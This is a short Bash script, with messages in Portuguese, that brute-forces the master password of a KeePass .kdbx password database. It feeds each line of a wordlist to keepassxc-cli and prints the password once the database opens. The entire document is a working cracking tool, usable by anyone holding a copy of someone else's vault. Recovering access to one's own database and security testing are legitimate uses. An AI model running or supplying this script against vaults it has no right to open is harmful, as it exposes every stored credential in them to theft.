#!/bin/bash
if [ $# -ne 2 ]; then
    echo "Uso: $0 <arquivo.kdbx> <wordlist.txt>"
    exit 1
fi

DB=$1
WORDLIST=$2

echo "[*] Iniciando força bruta..."
while IFS= read -r pass; do
    # Tenta listar o conteúdo do banco de dados passando a senha via stdin
    echo "$pass" | keepassxc-cli ls -q "$DB" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        echo "[+] SUCESSO! Senha encontrada: $pass"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] Senha não encontrada."
